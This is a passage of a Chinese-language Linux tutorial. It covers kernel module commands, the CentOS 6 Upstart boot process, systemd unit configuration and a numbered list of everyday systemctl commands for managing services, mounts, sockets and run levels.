/lib/modules/kernel_version/kernel</p></li><li><p>内核源码：/usr/src/kernels/kernel_version</p></li><li><p>内核版本：/proc/version</p></li><li><p>系统内核功能：/proc/sys/kernel/</p></li></ul><p>Linux关于内核的命令：</p><ul><li>lsmod：查看系统中加载的内核模块<ul><li>结果解释：</li><li>module：模块名称</li><li>size：模块大小</li><li>userd  by：此模块是否被其他模块使用（依赖关系）</li></ul></li><li>depmod ：更新模块的依赖关系并创建依赖关系文件<ul><li>/lib/modules/kernel_version/modules.dep：解决依赖关系的文件</li><li>-A ：查找比/lib/modules/kernel_version/modules.dep新的模块，如果有，才会更新，并写入该文件</li><li>-n：不写入依赖关系，直接输出到屏幕上</li><li>-e：显示当前系统中已经加载的但不可执行的模块名称</li></ul></li><li>modinfo：查看模块的信息<ul><li>modinfo  modules_name </li></ul></li><li>insmod：加载模块<ul><li>insmod  modules_name_full_path</li></ul></li><li>rmmod：删除模块<ul><li>rmmod  模块名称</li></ul></li><li>modprobe：加载删除模块<ul><li>-c：列出目前系统中所有的模块</li><li>-l：列出/1ib/modules/2.6.32-642.e16. x86_64/kernel当中所有模块的完整文件名</li><li>-f：强制加载</li><li>-r：删除某个模块，类似于rmmod</li></ul></li></ul><p>Linux内核模块额外的参数设置目录: /etc/modprobe .d/</p><p>Linux启动时所用的重要的目录:/etc/sysconfig</p><p><strong>init</strong>：</p><p>upstart：CentOS 6：采用时间驱动（event driven），把功能并行执行</p><pre><code>CentOS6上面Upstart大致的一个启动过程: 1.内核启动init，读取配置文件，在CentOS 6中只定义了运行级别2.系统初始化:( /etc/init/rcS.conf exec /etc/rc.d/rc.sysinit )3. init找到/etc/inittab文件，确定默认的运行级别(X) ( /etc/init/rcS.conf exec telinit$runlevel)4.触发相应的runleve1事件(/etc/init/rc.conf exec /etc/rc.d/rc $RUNLEVEL)5.开始运行/etc/rc.d/rc,传入参数X6./etc/rc.d/rc脚本进行一系列设置，最后运行相应的/etc/rcX. d/中的脚本7./etc/rcX.d/中的脚本按事先设定的优先级依次启动8.最后执行/etc/rc.d/rc.local9.加载终端或X-Window接口</code></pre><p>/etc/init目录：定义了系统初始化的配置文件</p><p>/proc/cmdline : 系统内核设置的参数</p><p>/etc/rc.d/rc.sysinit : 系统初始化主要配置文件</p><p>/etc/init/rc . conf:sysv运行级别</p><p>/etc/rc.d/存放每个运行级别所需要的服务，比如/etc/rc.d/rc3.d/目录定义的运行级别3所需要的服务<br>命名:<br>                K+数字+服务名</p><p>​                S+数字+服务名</p><p>​                K：kill结束进程</p><p>​                S：start开启服务</p><p>​                数字：代表启动的优先级</p><p>/etc/rc.d/rc.local：系统启动加载的最后一个脚本(用户的脚本)</p><p>sys  v  init  chkconfig : 定义系统服务在每个级别的运行状态<br>                –list:查看系统中所有服务的状态<br>                chkconfig –level 2345 httpd on<br>                chkconfig –level 2345 httpd off<br>upstart : initctl<br>服务分类:<br>            独立服务:应用程序自己控制<br>            超级服务:依赖于xineted进程来管理</p><p><strong>控制服务</strong>：service service_name   start | stop | restart | reload | status</p><h4 id="11-4-CentOS系统详解—systemd"><a href="#11-4-CentOS系统详解—systemd" class="headerlink" title="11.4 CentOS系统详解—systemd"></a>11.4 CentOS系统详解—systemd</h4><p> <strong>systemd特性</strong>：</p><ol><li><p>平行处理所有服务，加速开机流程：旧的init启动脚本是一项一项任务依序启动的模式，因此不相依的服务也是得要一个一个的等待。systemd可以让所有的服务同时启动，因此系统启动的速度变快了</p></li><li><p>一经要求就回应的on-demand启动方式：<br>systemd全部就是仅有一只systemd服务搭配systemctl指令来处理，无须其他额外的指令来支援。不像systemV还要init, chkconfig, service…等等指令.此外，systemd由于常驻存储器，因此任何要求(on-demand)都可以立即处理后续的daemon启动的任务</p></li><li><p>服务相依性的自我检查:<br>由于systemd可以自订服务相依性的检查，因此如果B服务是架构在A服务上面启动的，那当你在没有启动A服务的情况下仅手动启动B服务时，systemd会自动帮你启动A服务！</p></li><li><p>按照daemon功能分类：</p><p>systemd管理的服务非常多，首先systemd先定义所有的服务为一个服务单位(unit)，并将该unit归类到不同的服务类型(type)去。systemd将服务单位(unit)区分为service, socket , target , path, snapshot, timer等多种不同的类型(type),方便管理员的分类与记忆</p></li><li><p>将多个daemons集合成为一个群组：</p><p>如同systemV的init里头有个runlevel的特色，systemd亦将许多的功能集合成为一个所谓的target项目，这个项目主要在设计操作环境的建置，所以是集合了许多的daemons，也就是执行某个target就是执行好多个daemon的意思！</p></li><li><p>向下兼容旧有的init服务脚本：基本上，systemd是可以兼容于init的启动脚本的，因此，旧的init启动脚本也能够透过systemd来管理，只是更进阶的systemd功能就没有办法支援就是了</p></li><li><p>systemd有些地方无法完全取代init！包括：在runlevel的对应上，大概仅有runlevel1,3,5有对应到systemd的某些target类型而已，没有全部对应；</p></li><li><p>全部的systemd都用systemctl这个管理程序管理，而systemctl支援的语法有限制，不像/etc/init.d/ daemon就是纯脚本可以自订参数，systemctl不可自订参数；</p></li></ol><p>Systemctl是一个systemd工具，主要负责控制systemd系统和服务管理器。Systemd是一个系统管理守护进程、工具和库的集合，用于<strong>取代SystemV</strong>初始进程。</p><p><strong>Systemd的功能</strong>是<strong>用于集中管理和配置类UNIX系统</strong>.<br>在L inux生态系统中，Systemd被部署到了大多数的标准Linux发行版中，只有为数不多的几个<br>发行版尚未部署.Systemd通常是所有其它守护进程的父进程，但并非总是如此.</p><h5 id="11-4-1-CentOS-7-启动流程"><a href="#11-4-1-CentOS-7-启动流程" class="headerlink" title="11.4.1  CentOS 7 启动流程"></a>11.4.1  CentOS 7 启动流程</h5><ul><li><p># lsinitrd /boot/initramfs-3.10.0-1101.el7.x86_64.img   //查看虚根文件系统</p></li><li><p>在内核载入完毕、进行完硬件侦测与驱动程序载入后，内核会启动第一个进程systemd，systemd最主要的功能就是准备软件执行的环境，包括系统的主机名称、网络设定、语言设置、文件系统及其他服务的启动。而 所有的动作都会通过systemd 的预设启动服务集合/etc/systemd/system/default.target设定。另外， systemd 已经舍弃沿用多年的system V的runlevel ! </p></li><li><p>常见的操作环境target 与兼容于runlevel 的等级可以作为预设的操作环境(default. target)的主要项目有: multi-user.target 以及graphical.target这两个。当然还有rescue.target, emergency.target, shutdown.target等等，以及initrd.target!但是过去的systemV 使用的是一个称为runlevel (执行等级)的概念来启动系统的，systemd 为了兼容于旧式的systemV 操作行为，所以也将runlevel与操作环境做个结合！你可以使用底下的方式来查询两者间的对应关系</p></li></ul><pre><code># 11 -d /usr/lib/systemd/system/runlevel*.target # yum -y install bash-completion     //可以补齐参数或选项# systemctl list-dependencies graphical.target    //查看启动依赖关系# systemctl list-dependencies multi-user.target   //查看字符界面依赖关系</code></pre><p><strong>sysinit. target完成的功能</strong>:</p><ol><li>特殊文件系统装置的挂载:包括dev- hugepages . mount dev -mqueue . mount等挂载服务，主要在挂载跟巨量存储器分页使用与讯息队列的功能。挂载成功后，会在 /dev底下建立/dev/hugepages/ ，/dev/mqueue/ 等目录;</li><li>特殊档案系统的启用：包括磁碟阵列、网络磁碟(iscsi)、 LVM档案系统、档案系统对照服务(multipath) 等等，也会在这里被侦测与使用到!</li><li>开机过程的讯息传递与动画执行：使用plymouthd 服务搭配plymouth指令来传递动画与讯息</li><li>日志式登录档的使用：就是systemd- journald这个服务的启用啊！</li><li>载入额外的核心模块：透过/etc/modules -load . d/*.conf档案的设定，让核心额外载入管理员所需要的核心模块！</li><li>载入额外的核心参数设定：包括/etc/sysctl.conf以及/etc/sysctl.d/*.conf内部设定！</li><li>启动系统的随机数产生器：随机数产生器可以帮助系统进行一些密码加密演算的功能</li><li>设定终端机(console) 字形</li><li>启动动态装置管理员：就是udevd </li></ol><p><strong>与sys V兼容的rc.local操作</strong>:</p><pre><code># chmod +X /etc/rc.d/rc.local# systemctl start rc-local# systemctl enable rc-local</code></pre><p><strong>unit分类</strong>:</p><p>.service:一般服务类型(serviceunit):主要是系统服务，包括服务器本身所需要的本机服务以及网络服务</p><p>.socket:套接字(socketunit):主要是IPC (Inter-processcommunication)的传输讯息(socketfile)功能.这种类型的服务通常在监控讯息传递的套接字，当有透过此套接字传递讯息来说要连结服务时，就依据当时的状态将该用户的要求传送到对应的daemon,若daemon尚未启动，则启动该daemon后再传送用户的要求.</p><p>.target :执行环境类型(targetunit)</p><p>.mount :文件系统挂载相关的服务( automountunit/mountunit):例如来自网络的自动挂载、NFS档案系统挂载等与档案系统相关性较高的程序管理.</p><p>.path:侦测特定档案或目录类型(pathunit):某些服务需要侦测某些特定的目录来提供队列服务，例如最常见的打印服务，就是透过侦测打印队列目录来启动打印功能!</p><p>.timer:循环执行的服务(timerunit) :这个东西有点类似anacrontab ！不过是由systemd主动提供的，比anacrontab更加有弹性!</p><p><strong>与systemd的daemon运作过程相关的目录简介</strong>:<br>1./usr/lib/systemd/system/：使用CentoS官方提供的软件安装后，预设的启动脚本设定档都放在这里</p><p>2./run/systemd/system/ ：系统执行过程中所产生的服务脚本,这些脚本的优先序要比/usr/lib/ systemd/system/高!</p><p>3./etc/systemd/ system/：管理员依据主机系统的需求所建立的执行脚本,其实这个目录有点像以前/etc/rc.d/rc5.d/Sxx之类的功能！执行优先序又比/run/systemd/system/高！</p><p>4./etc/sysconfig/*:几乎所有的服务都会将初始化的一些选项设定写入到这个目录下，举例来说，mandb所要更新的manpage索引中，需要加入的参数就写入到此目录下的man-db当中！而网络的设定则写在/etc/sysconfig/network -scripts/这个目录内</p><p>5./var/lib/ ：一些会产生资料的服务都会将他的资料写入到/var/lib/目录中.举例来说，数据库管理系统Mariadb的数据库预设就是写入/var/lib/mysql/这个目录下！</p><p>6./run/:放置了好多daemon的暂存档，包括lockfile以及PIDfile等等.</p><p><strong>systemctl项目简介</strong>:</p><p>#cat  /usr/lib/systemd/system/sshd.service</p><p>.service大概能够将整个设定分为三个部份，就是：</p><p>​    [Unit]：unit本身的说明，以及与其他相依赖daemon的设定，包括在什么服务之后才启动此unit之类的设定值；<br>​    [Service], [Socket], [Timer], [Mount], [Path]..：不同的unit type就得要使用相对应的设定项目.我们拿的是sshd . service来当模板，,所以这边就使用Service来设定.这个项目内主要在规范服务启动的脚本、环境设定档档名、重新启动的方式等等，</p><p>​    [Install]:这个项目就是将此unit安装到哪个target里面去的意思!</p><p>至于设定档内有些设定规则还是得要说明一下:<br>设定项目通常是可以重复的，例如我可以重复设定两个After在设定档中，不过，后面的设定会取代前面的!因此，如果你想要将设定值归零,可以使用类似[After=」的设定，亦即该项目的等号后面什么都没有，,就将该设定归零了(reset).<br>        如果设定参数需要有「是/否」 的项目(布尔值，boolean)，你可以使用1,yes，true，on代表启动，用0,no,false,off代表关闭!<br>空白行、开头为#或;的那一行，都代表注解！</p><p><strong>Unit部分说明</strong>:<br>Description  ：服务的描述信息<br>Documentation  ：提供给管理员的一些帮助文档!提供的文件可以是如下的格式：Documentation=<a href="http://www" target="_blank" rel="noopener">http://www</a>.. .. Documentat ion=man : sshd(8 )Documentation=file:/etc/ssh/sshd_ config<br>After ：说明此unit是在哪个daemon启动之后才启动的意思！基本上仅是说明服务启动的顺序而已，并没有强制要求里头的服务一定要启动后此unit才能启动。以sshd.service的内容为例，该服务提到After后面有network.target以及sshd-keygen.service,但是若这两个unit没有启动而强制启动sshd.service的话，那么sshd.service应该还是能够启动的！这与Requires的设定是有差异的!<br>Before  ：与After的意义相反，是在什么服务启动前最好启动这个服务的意思，不过这仅是规范服务启动的顺序，并非强制要求的意思<br>Requires  ：明确的定义此unit需要在哪个daemon启动后才能够启动!就是设定依赖服务啦！如果在此项设定的前导服务没有启动，那么此unit就不会被启动！<br>Wants  ：与Requires刚好相反，规定的是这个unit之后最好还要启动什么服务比较好的意思！不过，并没有明确的规定就是了!主要的目的是希望建立让使用者比较好操作的环境。因此，这个Wants后面接的服务如果没有启动，其实不会影响到这个unit本身！<br>Conflicts  ：代表冲突的服务！也就是这个项目后面接的服务如果有启动，那么我们这个unit本身就不能启动!<br>我们unit有启动，则此项目后的服务就不能启动！</p><p><strong>[Service]部分说明</strong>:<br>Type:说明这个daemon启动的方式，会影响到ExecStart！一般来说，有底下几种类型：</p><p>simple：预设值，这个daemon主要由ExecStart接的指令串来启动，启动后常驻于存储器中.<br>forking：由ExecStart启动的程序透过spawns延伸出其他子程序来作为此daemon的主要服务.原生的父程序在启动结束后就会终止运作.传统的unit服务大多属于这种项目，例如httpd这个Www服务，当httpd的程序因为运作过久因此即将终结了，则systemd会再重新生出另一个子程序持续运作后,再将父程序删除.<br>oneshot：与simple类似，不过这个程序在工作完毕后就结束了，不会常驻在存储器中，<br>dbus：与simple类似，但这个daemon必须要在取得一个D-Bus的名称后，才会继续运作！因此设定这个项目时，通常也要设定BusName=才行!<br>idle：与simple类似，意思是,要执行这个daemon必须要所有的工作都顺利执行完毕后才会执行.这 类的daemon通常是开机到最后才执行即可的服务！比较重要的项目大概是simple, forking 与oneshot 了！毕竟很多服务需要子程序(forking)，而有更多的动作只需要在开机的时候执行次(oneshot) ，例如文件系统的检查与挂载啊等等的。</p><p>EnvironmentFile：可以指定启动脚本的shell环境!例如sshd.service 的设定档写入到/etc/sysconfig/sshd 当中！你也可以使用Environment= 后面接多个不同的Shell变量来给予设定！<br>ExecStart：就是实际执行此daemon的指令或脚本程序。你也可以使用ExecStartPre (之前)以及ExecStartPost (之后)两个设定项目来在实际启动服务前，进行额外的指令行为。但需要特别注意的是，指令串仅接受「指令参数参数…」的格式，不能接受&lt;，&gt;,&gt;&gt;，|，&amp;等特殊字符，很多的bash 语法也不支援喔！ 所以，要使用这些特殊的字符时，最好直接写入到指令脚本里面去！不过，上述的语法也不是完全不能用，亦即，若要支援比较完整的bash 语法，那你得要使用Type=oneshot 才行喔！其他的 Type不支持这些字符</p><p>ExecStop：与systemctl stop 的执行有关，关闭此服务时所进行的指令。<br>Restart：当设定Restart=1 时，则当此daemon服务终止后，会再次的启动此服务。举例来说，如果你在tty2使用文字界面登入，操作完毕后登出，基本上，这个时候tty2 就已经结束服务了。但是你会看到荧幕又立刻产生一个新的tty2 的登入画面等待你的登入！那就是Restart的功能！除非使用systemctl强制将此服务关闭，否则这个服务会源源不绝的一直重复产生！</p><p>RemainAfterExit：当设定为RemainAfterExit=1 时，则当这个daemon所属的所有程序都终止之后，此服务会再尝试启动。这对于Type=oneshot 的服务很有帮助！</p><p>TimeoutSec：若这个服务在启动或者是关闭时，因为某些缘故导致无法顺利「正常启动或正常结束」的情况下，则我们要等多久才进入「强制结束」的状态！</p><p>KillMode：可以是process, control-group ，none的其中一种，如果是process 则daemon终止时，只会终止主要的程序(ExecStart 接的后面那串指令)，如果是control -group时，则由此daemon 所产生的其他control-group的程序也都会被关闭，如果是none的话，则没有程序被关闭</p><p>RestartSec：与Restart有点相关性，如果这个服务被关闭，然后需要重新启动时，大概要sleep 多少时间再重新启动的意思。预设是100ms(亳秒)。</p><p><strong>Install部分说明</strong>：</p><p>WantedBy:这个设定后面接的大部分是*.target unit ！意思是，这个unit本身是附挂在哪一个target unit 底下的！一般来说，大多的服务性质的unit都是附挂在multi-user.target 底下!</p><p>Also:当目前这个unit 本身被enable 时，Also 后面接的unit也请enable的意思!也就是具有相依性的服务可以写在这里呢!<br>Alias:进行一个连结的别名的意思！当systemctl enable相关的服务时，则此服务会进行连结档的建立！以multi -user. target为例，这个家伙是用来作为预设操作环境default.target的规划，因此当你设定用成default.target时，这个/etc/systemd/system/default.target就会链接到/usr/lib/systemd/system/multi-user.target !</p><h5 id="11-4-2-systemctl命令详细使用说明"><a href="#11-4-2-systemctl命令详细使用说明" class="headerlink" title="11.4.2 systemctl命令详细使用说明:"></a>11.4.2 <strong>systemctl命令详细使用说明:</strong></h5><p>1.首先检查你的系统中是否安装有systemd并确定当前安装的版本</p><pre><code># systemd  --version</code></pre><p>2.检查systemd和systemctl的二进制文件和库文件的安装位置，</p><pre><code># whereis systemd# whereis systemctl</code></pre><p>3.检查systemd是否运行</p><pre><code>#ps - eaf | grepsys temd</code></pre><p>注意：systemd是作为父进程(PID=1) 运行的。在上面带(-e)参数的ps命令输出中，选择所有进程，(-a)选择除会话前导外的所有进程,并使用(-f)参数输出完整格式列表(即-eaf)</p><p>4.分析systemd启动进程</p><pre><code># systemd-analyze</code></pre><p>5.分析启动时各个进程花费的时间</p><pre><code># systemd-analyzeblame</code></pre><p>6.分析启动时的关键链</p><pre><code># systemd-analyzecritical-chain</code></pre><p>7.列出所有可用单元</p><pre><code># systemctl list-unit-files</code></pre><p>8.列出所有运行中单元</p><pre><code># systemctl list-units</code></pre><p>9.列出所有失败单元</p><pre><code># systemctl --failed</code></pre><p>10.检查某个单元(如cron. service)是否开机自启</p><pre><code># systemctl is-enabled crond.service</code></pre><p>11.检查某个单元或服务是否运行</p><pre><code># systemctl status firewalld.service</code></pre><p><strong>使用Systemct1控制并管理服务</strong></p><p>12.列出所有服务(包括启用的和禁用的)</p><pre><code># systemctl list-unit-files  --type=service</code></pre><ol start="13"><li>Linux中如何启动、重启、停止、重载服务以及检查服务(如httpd.service)状态</li></ol><pre><code># systemctl start httpd.service# systemctl restart httpd.service# systemctl stop httpd.service# systemctl reload httpd.service# systemctl status httpd.service</code></pre><p>注意：当我们使用systemctl的start，restart, stop和reload命令时，我们不会从终端获取到任何输出内容，只有status命令可以打印输出。</p><p>14.如何激活服务并在启动时启用或禁用服务(即系统启动时自动启动服务)</p><pre><code># systemctl is-active httpd.service# systemctl enable httpd.service# systemctl disable httpd.service</code></pre><p>15.如何屏蔽(让它不能启动)或显示服务( 如httpd. service)</p><pre><code># systemctl mask httpd.service# systemctl unmask httpd.service</code></pre><p>16.使用systemctl命令杀死服务</p><pre><code># systemctl kill httpd# systemctl status httpd</code></pre><p><strong>使用systemctl 控制并管理挂载点</strong></p><p>17.列出所有系统挂载点</p><pre><code># systemctl list-unit-files --type=mount</code></pre><p>18.挂载、卸载、重新挂载、重载系统挂截点并检查系统中挂载点状态</p><pre><code># systemctl start tmp.mount# systemctl stop tmp.mount# systemctl restart tmp.mount# systemctl re load tmp.mount# systemctl status tmp.mount</code></pre><p>19.在启动时激活、启用或禁用挂载点(系统启动时自动挂载)</p><pre><code>#systemctl is-active tmp.mount#systemctl enable tmp.mount#systemctl disable tmp.mount</code></pre><p>20.在L inux中屏蔽(让它不能启用)或可见挂载点</p><pre><code># systemctl mask tmp.mount# systemctl unmask tmp.mount </code></pre><p><strong>使用 systemctl 控制并管理套接口</strong></p><p>21.列出所有可用系统套接口</p><pre><code># systemctl list-unit-files --type=socket</code></pre><p>22.在Linux中启动、重启、停止、重载套接口并检查其状态</p><pre><code># systemctl start cups.socket# systemctl restart cups.socket# systemctl stop cups.socket# systemctl reload cups.socket # systemctl status cups.socket</code></pre><p>23.在启动时激活套接口，并启用或禁用它( 系统启动时自启动)</p><pre><code>#systemctl is-active cups.socket#systemctl enable cups.socket#systemctl disable cups.socket</code></pre><p>24.屏蔽( 使它不能启动)或显示套接口</p><pre><code># systemctl mask cups.socket# systemctl unmask cups.socket</code></pre><p>25.获取当前某个服务的CPU分配额(如httpd)</p><pre><code># systemctl show -p CPUShares httpd.service</code></pre><p>注意:各个服务的默认CPU分配份额=1024,你可以增加/减少某个进程的CPU分配份额.</p><p>26.将某个服务( httpd . service)的CPU分配份额限制为2000CPUShares/</p><pre><code># systemctl set-property httpd.service CPUShares=2000# systemctl show -p CPUShares httpd.service</code></pre><p>注意：当你为某个服务设置CPUShares,会自动创建一个以服务名命名的目录(如httpd，service),里面包含了一个名为90-CPUShares.conf的文件，该文件含有CPUShare限制信息,你可以通过以下方式查看该文件:</p><pre><code># vim /etc/systemd/system/httpd.service.d/50-CPUShares.conf[Service]CPUShares=2000</code></pre><p>27.检查某个服务的所有配置细节</p><pre><code># systemctl show httpd</code></pre><p>28.分析某个服务(httpd) 的关键链</p><pre><code># systemd-analyze critical-chainhttpd.service</code></pre><p>29.获取某个服务(httpd) 的依赖性列表</p><pre><code>#systemctl list-dependencies httpd.service</code></pre><p>30.按等级列出控制组</p><pre><code># systemd-cgls</code></pre><p>31.按CPU、内存、输入和输出列出控制组</p><pre><code># systemd-cgtop</code></pre><p><strong>控制系统运行等级</strong><br>32.启动系统救援模式</p><pre><code># systemctl rescue</code></pre><p>33.进入紧急模式</p><pre><code># systemct lemergency</code></pre><p>34.列出当前使用的运行等级</p><pre><code># systemctl get-default</code></pre><p>35.启动运行等级5，即图形模式</p><pre><code># systemctl isolate runlevel5.target</code></pre><p>或</p><pre><code># systemctl isolate graphical.target</code></pre><p>36.启动运行等级3,即多用户模式(命令行)</p><pre><code># systemctl set-default runlevel3.target# systemctl set-default runlevel5.target</code></pre><p>37.重启、停止、挂起、休眠系统或使系统进入混合睡眠</p><pre><code># systemctl reboot# systemctl halt# systemctl suspend # systemctl hibernate # systemctl hybrid-sleep</code></pre><hr><pre><code>###测试</code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
